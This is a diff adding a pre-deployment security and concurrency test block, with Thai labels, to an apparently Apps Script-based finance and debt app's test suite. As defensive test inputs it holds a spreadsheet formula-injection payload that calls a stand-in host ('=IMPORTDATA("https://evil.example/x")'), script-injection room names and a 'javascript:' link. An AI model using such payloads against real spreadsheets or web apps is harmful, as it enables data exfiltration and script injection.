@@ -1400,6 +1400,160 @@ console.log('\n── 30. ก้อนหนี้แสดงสองหน้
   near('ปิดแล้ว หน้าหนี้สินเหลือแค่ของตัวเอง', debtSummary_('หนี้รอง', 'all').totalDebt, 1000000, 0);
 }
 
+console.log('\n── 31. ตรวจเชิงรุกก่อน deploy: ชีต ความปลอดภัย และการเขียนพร้อมกัน ──');
+{
+  const st = require('./mock-gas.js').store;
+  const admKey = getSetting_('admin_token', '');
+
+  // ── ช่องข้อความที่มีเวลา ห้ามถูกตัดเวลาทิ้ง (เวลาหมดอายุการเข้าใช้งาน / ปลดล็อกบัญชี)
+  const timed = new Date('2026-10-22T05:30:15.000Z');
+  check('เซลล์วันที่ที่มีเวลา อ่านกลับเป็น ISO เวลาเดิม', textFromCell_(timed), timed.toISOString());
+  check('ข้อความวันที่แบบ JS ที่มีเวลา อ่านกลับเวลาเดิม',
+    new Date(textFromCell_(String(timed))).getTime(), timed.getTime());
+  check('เวลาแบบ ISO ถูกบังคับเป็นข้อความตอนเขียน', serializeValue_(timed.toISOString(), 'text').charAt(0), "'");
+
+  // ── สูตรในช่องข้อความ (formula injection)
+  const evil = '=IMPORTDATA("https://evil.example/x")';
+  check('ข้อความขึ้นต้นด้วย = ถูกบังคับเป็นข้อความ', serializeValue_(evil, 'text'), "'" + evil);
+  const fin = saveFinance_({ date: '2026-10-01', kind: 'รายจ่าย', amount: 10, note: evil });
+  check('บันทึกแล้วได้ข้อความเดิม ไม่มี \' ติดมา', fin.note, evil);
+  const fin2 = saveFinance_({ date: '2026-10-01', kind: 'รายจ่าย', amount: 10, note: '+SUM(A1)' });
+  check('อ่านกลับจากชีตได้ข้อความเดิม', findRow_(SHEETS.FINANCE, fin2.id).note, '+SUM(A1)');
+  deleteFinance_(fin2.id);
+  deleteFinance_(fin.id);
+  check('CSV: ข้อความขึ้นต้นด้วย = ใส่ \' กัน Excel รันสูตร', csvCell_('=1+1'), "'=1+1");
+  check('CSV: ตัวเลขติดลบไม่ถูกแตะ', csvCell_(-500), '-500');
+  check('CSV: ข้อความ -สูตร ก็กันด้วย', csvCell_('-2+3'), "'-2+3");
+
+  // ── การตั้งค่าที่เป็นตัวเลข 0 นำหน้าต้องไม่หาย
+  setSetting_('test_code', '0451');
+  check('ค่าตั้งค่า 0 นำหน้าไม่หาย', getSetting_('test_code', ''), '0451');
+
+  // ── ไฟล์สำรองต้องไม่มีกุญแจลับ
+  setSetting_('door_code', '0451');
+  const dump = exportAll_();
+  const leaked = (dump.sheets[SHEETS.SETTINGS] || []).filter(r => SECRET_SETTINGS.indexOf(r.key) >= 0);
+  check('ไฟล์สำรอง JSON ไม่มีกุญแจกู้ระบบ/กุญแจแชร์/รหัสประตู', leaked.length, 0);
+  const csv = exportCsv_(SHEETS.SETTINGS).content;
+  check('CSV ของการตั้งค่าไม่มีกุญแจกู้ระบบ', csv.indexOf(admKey) < 0, true);
+  check('CSV ของการตั้งค่าไม่มีแถว door_code', /(^|\n)door_code,/.test(csv), false);
+  // ไฟล์ที่ถูกแก้มาฝังกุญแจของคนอื่น ต้องไม่ถูกนำเข้า
+  importAll_({ mode: 'merge', data: { sheets: { Settings: [{ key: 'admin_token', label: 'x', value: 'ATTACKER', note: '' }] } } });
+  check('นำเข้าไฟล์สำรองเขียนทับกุญแจกู้ระบบไม่ได้', getSetting_('admin_token', ''), admKey);
+  const usersBefore = readRows_(SHEETS.USERS).length;
+  const r = importAll_({ mode: 'replace', data: { sheets: { Users: [{ username: 'nobody', role: 'ดูอย่างเดียว', status: 'ใช้งาน' }] } } });
+  check('แทนที่บัญชีด้วยไฟล์ที่ไม่มีผู้ดูแล ถูกข้าม (กันล็อกทุกคนออก)', readRows_(SHEETS.USERS).length, usersBefore);
+  check('บอกเหตุผลที่ข้าม', /ไม่มีผู้ดูแล/.test(String(r[SHEETS.USERS])), true);
+
+  // ── ห้องที่มีอักขระฝังโค้ด
+  check('ห้องที่มี <script> ถูกปฏิเสธ',
+    api('ac.save', { _key: admKey, record: { room: '1<script>', bookDate: '2026-10-01' } }).ok, false);
+  check('ห้องที่มี \' ถูกปฏิเสธ',
+    api('repair.save', { _key: admKey, record: { room: "1'onmouseover=alert(1)", reportDate: '2026-10-01', items: 'x' } }).ok, false);
+  check('ห้องปกติยังใช้ได้', cleanRoom_(' 201 ', true), '201');
+  check('ชื่อพื้นที่ภาษาไทยยังใช้ได้', cleanRoom_('ส่วนกลาง (ชั้น 1)', false), 'ส่วนกลาง (ชั้น 1)');
+
+  // ── ก้อนหนี้ที่ยังมีของผูกอยู่ ลบไม่ได้
+  const d1 = saveDebt_({ ledger: 'หนี้รอง', title: 'ทดสอบลบ', principal: 1000, startDate: '2026-01-01' });
+  const p1 = saveDebtPayment_({ ledger: 'หนี้รอง', debtId: d1.id, payDate: '2026-02-01', principal: 100 });
+  let blocked = ''; try { deleteDebt_(d1.id); } catch (e) { blocked = e.message; }
+  check('ก้อนที่มีรายการชำระผูกอยู่ ลบไม่ได้', /รายการชำระผูกอยู่ 1/.test(blocked), true);
+  const kid = saveDebt_({ ledger: 'หนี้รอง', title: 'ทดสอบลูก', principal: 10, parentId: d1.id });
+  deleteDebtPayment_(p1.id);
+  blocked = ''; try { deleteDebt_(d1.id); } catch (e) { blocked = e.message; }
+  check('ก้อนที่มีก้อนย่อยผูกอยู่ ลบไม่ได้', /ก้อนหนี้ 1 ก้อน/.test(blocked), true);
+  deleteDebt_(kid.id); deleteDebt_(d1.id);
+  check('ปลดของที่ผูกแล้ว ลบได้', findRow_(SHEETS.DEBTS, d1.id), null);
+  // รายการเก่าที่ผูกกับก้อนที่ถูกลบไปแล้ว ยังแก้ได้
+  const orphan = saveDebtPayment_({ ledger: 'หนี้รอง', debtId: 'DEBT-ไม่มีแล้ว', payDate: '2026-02-02', principal: 5 });
+  check('รายการที่ผูกกับก้อนที่ไม่มีแล้ว บันทึกได้ (ปลดการผูกให้)', orphan.debtId, '');
+  deleteDebtPayment_(orphan.id);
+
+  // ── เลขแถวเลื่อนระหว่างอ่านกับเขียน (มีคนลบแถวข้างบนไปก่อน)
+  const a = saveFinance_({ date: '2026-10-02', kind: 'รายจ่าย', note: 'แถว A', amount: 1 });
+  const b = saveFinance_({ date: '2026-10-03', kind: 'รายจ่าย', note: 'แถว B', amount: 2 });
+  const c = saveFinance_({ date: '2026-10-04', kind: 'รายจ่าย', note: 'แถว C', amount: 3 });
+  const staleC = findRow_(SHEETS.FINANCE, c.id);         // อ่านไว้ก่อน
+  deleteFinance_(a.id);                                  // แล้วมีคนลบแถวข้างบน
+  updateRow_(SHEETS.FINANCE, staleC._row, Object.assign({}, staleC, { note: 'แถว C แก้แล้ว' }));
+  check('แก้ด้วยเลขแถวเก่า: แก้ถูกรายการ', findRow_(SHEETS.FINANCE, c.id).note, 'แถว C แก้แล้ว');
+  check('แก้ด้วยเลขแถวเก่า: รายการอื่นไม่ถูกทับ', findRow_(SHEETS.FINANCE, b.id).note, 'แถว B');
+  const staleB = findRow_(SHEETS.FINANCE, b.id);
+  const z = saveFinance_({ date: '2026-10-05', kind: 'รายจ่าย', note: 'แถว Z', amount: 4 });
+  deleteRow_(SHEETS.FINANCE, staleB._row + 1, staleB);   // เลขแถวผิด แต่บอกว่าต้องการลบ B
+  check('ลบด้วยเลขแถวผิด: ลบถูกรายการ', findRow_(SHEETS.FINANCE, b.id), null);
+  check('ลบด้วยเลขแถวผิด: รายการอื่นยังอยู่', !!findRow_(SHEETS.FINANCE, c.id) && !!findRow_(SHEETS.FINANCE, z.id), true);
+  let gone = ''; try { updateRow_(SHEETS.FINANCE, staleB._row, staleB); } catch (e) { gone = e.message; }
+  check('แก้รายการที่ถูกลบไปแล้ว: ไม่เขียนทับอะไร และบอกให้โหลดใหม่', /ถูกลบหรือย้าย/.test(gone), true);
+  deleteFinance_(c.id); deleteFinance_(z.id);
+
+  // ── คำสั่งเขียนต้องรอคิวกัน และคืนคิวเสมอแม้เกิด error
+  const taken0 = st.locks.taken;
+  api('finance.save', { _key: admKey, record: { date: 'ไม่ใช่วันที่', kind: 'รายจ่าย', amount: 1 } });
+  check('คำสั่งเขียนเข้าคิว', st.locks.taken > taken0, true);
+  check('error แล้วก็ยังคืนคิว', st.locks.held, 0);
+  const taken1 = st.locks.taken;
+  api('debt.summary', { _key: admKey, ledger: 'หนี้หลัก', year: 'all' });
+  check('คำสั่งอ่านไม่ต้องรอคิว', st.locks.taken, taken1);
+
+  // ── ล็อกซ้อนกันในคำสั่งเดียวกันต้องไม่ค้างตัวเอง และคืนเสมอ
+  const t0 = st.locks.taken;
+  const inner = withScriptLock_(() => withScriptLock_(() => 'ok'));
+  check('ล็อกซ้อนกัน: ทำงานได้ ไม่ค้าง', inner, 'ok');
+  check('ล็อกซ้อนกัน: ขอคิวจริงแค่ครั้งเดียว', st.locks.taken - t0, 1);
+  try { withScriptLock_(() => { throw new Error('พัง'); }); } catch (e) {}
+  check('งานพังกลางทาง ก็ยังคืนคิว', st.locks.held, 0);
+  // จัดคอลัมน์ใหม่ (ล้างทั้งชีตแล้วเขียน) ต้องทำใต้ล็อก
+  const fsh = getSpreadsheet_().getSheetByName(SHEETS.FINANCE);
+  const before = JSON.stringify(readRows_(SHEETS.FINANCE).map(r => [r.id, r.date, r.amount]));
+  // สลับคอลัมน์ 1 กับ 2 ทั้งหัวตารางและข้อมูล (เหมือนมีคนลากคอลัมน์ในชีต)
+  const n = fsh.getLastRow();
+  const colA = fsh.getRange(1, 1, n, 1).getValues(), colB = fsh.getRange(1, 2, n, 1).getValues();
+  fsh.getRange(1, 1, n, 1).setValues(colB); fsh.getRange(1, 2, n, 1).setValues(colA);
+  const t1 = st.locks.taken;
+  check('จัดคอลัมน์ใหม่แล้วข้อมูลกลับมาตรงเดิมทุกแถว',
+    JSON.stringify(readRows_(SHEETS.FINANCE).map(r => [r.id, r.date, r.amount])), before);
+  check('จัดคอลัมน์ใหม่ทำใต้ล็อก', st.locks.taken > t1, true);
+  check('จัดคอลัมน์เสร็จคืนคิว', st.locks.held, 0);
+
+  // ── ไฟล์แนบ: รับเฉพาะรูป/PDF ดูจากเนื้อไฟล์จริง
+  const b64 = buf => 'data:application/octet-stream;base64,' + Buffer.from(buf).toString('base64');
+  const jpg = b64([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46]);
+  const html = b64(Buffer.from('<html><script>alert(1)</script></html>'));
+  const ok1 = api('file.upload', { _key: admKey, bucket: 'misc', files: [{ name: 'slip.jpg', mimeType: '', dataUrl: jpg }] });
+  check('อัปโหลดรูป JPG ได้ (แม้หน้าเว็บไม่บอกชนิดไฟล์)', ok1.ok && ok1.data.length === 1, true);
+  const bad = api('file.upload', { _key: admKey, bucket: 'misc', files: [{ name: 'x.png', mimeType: 'image/png', dataUrl: html }] });
+  check('ไฟล์ HTML ที่ปลอมชื่อเป็น .png ถูกปฏิเสธ', bad.ok, false);
+  check('บอกชนิดไฟล์ที่รับ', /เฉพาะรูปภาพ/.test(bad.error || ''), true);
+  const pdf = b64(Buffer.from('%PDF-1.7\n'));
+  check('อัปโหลด PDF ได้', api('file.upload', { _key: admKey, bucket: 'misc', files: [{ name: 'r.pdf', dataUrl: pdf }] }).ok, true);
+  const mixed = api('file.upload', { _key: admKey, bucket: 'misc', files: [{ name: 'a.jpg', dataUrl: jpg }, { name: 'b.exe', dataUrl: html }] });
+  check('มีไฟล์ไม่ผ่านปนมา: ไม่สร้างไฟล์ไหนเลย', mixed.ok, false);
+
+  // ── ลบ/อ่านไฟล์ได้เฉพาะไฟล์ในโฟลเดอร์ของระบบ
+  const mine = ok1.data[0].id;
+  const outside = DriveApp.createFolder('เอกสารส่วนตัวของเจ้าของ').createFile({ n: 'สัญญา.pdf' }).getId();
+  check('ลบไฟล์นอกโฟลเดอร์ของระบบไม่ได้', api('file.trash', { _key: admKey, id: outside }).ok, false);
+  let ocrOut = ''; try { appFileById_(outside); } catch (e) { ocrOut = e.message; }
+  check('อ่านข้อความ (OCR) จากไฟล์นอกโฟลเดอร์ของระบบไม่ได้', /ไม่ได้อยู่ในโฟลเดอร์/.test(ocrOut), true);
+  check('ไฟล์ที่ระบบอัปโหลดเอง เปิดได้', !!appFileById_(mine), true);
+  check('ลบไฟล์แนบของระบบได้ตามปกติ', api('file.trash', { _key: admKey, id: mine }).ok, true);
+  // ลิงก์แปลก ๆ ในช่องไฟล์แนบ ไม่กลายเป็นลิงก์
+  check('javascript: ในช่องไฟล์แนบ ไม่ถูกส่งเป็นลิงก์', toFileRefs_('javascript:alert(1)')[0].url, '');
+  check('ลิงก์ https ทั่วไปยังใช้ได้', toFileRefs_('https://example.com/a.pdf')[0].url, 'https://example.com/a.pdf');
+
+  // ── ย้ายข้อมูล: ทำสำเนาทั้งไฟล์ก่อน และคืนคิว
+  st.copies = [];
+  props_().setProperty('SCHEMA_VERSION', '9');
+  runMigrations_();
+  check('ย้ายข้อมูลแล้วทำสำเนาทั้งไฟล์ไว้ก่อน', st.copies.length, 1);
+  check('ย้ายข้อมูลเสร็จคืนคิว', st.locks.held, 0);
+  st.copies = [];
+  runMigrations_();
+  check('ไม่มีอะไรต้องย้าย ไม่ทำสำเนาซ้ำ', st.copies.length, 0);
+  saveDebt_(Object.assign({}, readRows_(SHEETS.DEBTS).find(d => d.title.indexOf('ค่าก่อสร้าง') >= 0), { alsoIn: '' }));
+}
+
 console.log('\n════════════════════════════');
 console.log(`ผ่าน ${pass} · ไม่ผ่าน ${fail}`);
 process.exit(fail ? 1 : 0);
